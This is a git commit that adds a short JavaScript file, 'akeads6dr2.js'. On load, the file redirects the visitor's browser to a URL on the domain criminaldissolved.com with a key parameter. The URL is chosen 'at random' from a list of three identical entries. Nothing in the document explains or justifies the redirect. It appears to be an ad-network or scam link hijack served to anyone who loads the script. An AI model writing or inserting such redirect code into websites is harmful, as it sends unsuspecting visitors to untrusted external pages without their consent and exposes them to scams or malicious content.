4df483779aec061826f3e1e19a4b5e02a3ad400b
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-06-12 22:14:10 +0700

    Create akeads6dr2.js

---
+++ akeads6dr2.js
@@ -0,0 +1,9 @@
+var dataUrl = [
+
+  'https://criminaldissolved.com/bred39e8u?key=bd7acaa1b98d1e5da4e7764dd74a9fae',
+  'https://criminaldissolved.com/bred39e8u?key=bd7acaa1b98d1e5da4e7764dd74a9fae',
+  'https://criminaldissolved.com/bred39e8u?key=bd7acaa1b98d1e5da4e7764dd74a9fae'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
